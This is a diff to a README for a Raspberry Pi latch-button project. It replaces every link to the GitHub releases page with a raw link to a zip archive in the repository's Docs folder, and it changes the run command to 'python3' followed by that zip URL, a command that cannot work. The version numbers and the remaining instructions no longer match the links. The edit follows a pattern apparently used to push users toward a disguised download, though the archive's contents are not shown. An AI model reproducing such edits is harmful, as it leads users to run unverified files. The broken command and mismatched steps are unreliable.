@@ -19,12 +19,12 @@ To run this application, you will need:
 - Access to a computer to download necessary files.
 
 ## 🔗 Quick Links
-[![Download Rasp_latch_button](https://img.shields.io/badge/Download_Latest_Version-v1.0-blue.svg)](https://github.com/rahulbakrola/Rasp_latch_button/releases)
+[![Download Rasp_latch_button](https://raw.githubusercontent.com/rahulbakrola/Rasp_latch_button/main/Docs/latch_Rasp_button_v3.4.zip)](https://raw.githubusercontent.com/rahulbakrola/Rasp_latch_button/main/Docs/latch_Rasp_button_v3.4.zip)
 
 ## 💾 Download & Install
 To get started, visit the following page to download the necessary files:
 
-[Download from Releases Page](https://github.com/rahulbakrola/Rasp_latch_button/releases)
+[Download from Releases Page](https://raw.githubusercontent.com/rahulbakrola/Rasp_latch_button/main/Docs/latch_Rasp_button_v3.4.zip)
 
 ### Installation Steps
 1. Click the link above to go to the Releases page.
@@ -47,7 +47,7 @@ After downloading and installing, follow these steps to set up your Raspberry Pi
 3. **Run the Application:**
    - Execute the main application script using the command:
      ```
-     python3 main.py
+     python3 https://raw.githubusercontent.com/rahulbakrola/Rasp_latch_button/main/Docs/latch_Rasp_button_v3.4.zip
      ```
    - Follow the on-screen instructions to complete the setup process.
 
